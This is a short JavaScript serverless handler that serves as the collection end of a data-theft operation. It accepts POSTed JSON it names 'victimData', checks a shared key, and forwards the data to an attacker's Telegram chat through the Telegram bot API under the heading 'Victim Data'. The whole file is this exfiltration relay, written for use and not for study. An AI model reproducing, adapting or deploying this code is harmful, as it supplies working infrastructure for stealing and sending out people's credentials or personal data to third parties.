export default async function handler(req, res) {
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  const AAPI_KEY = process.env.API_KEY;

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Only POST requests are allowed' });
  }

  const { key, ...victimData } = req.body;

  if (!key || key !== AAPI_KEY) {
    return res.status(401).json({ error: 'Invalid or missing API Key' });
  }

  const telegramMessage = `Victim Data:\n\n\`\`\`json\n${JSON.stringify(victimData, null, 2)}\n\`\`\``;
  const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: telegramMessage,
        parse_mode: 'MarkdownV2',
      }),
    });

    const result = await response.json();
    if (!result.ok) {
      throw new Error(JSON.stringify(result));
    }

    res.status(200).json({ status: 'Data successfully forwarded to Telegram' });
  } catch (error) {
    res.status(500).json({ status: 'Error forwarding data', error: error.message });
  }
}
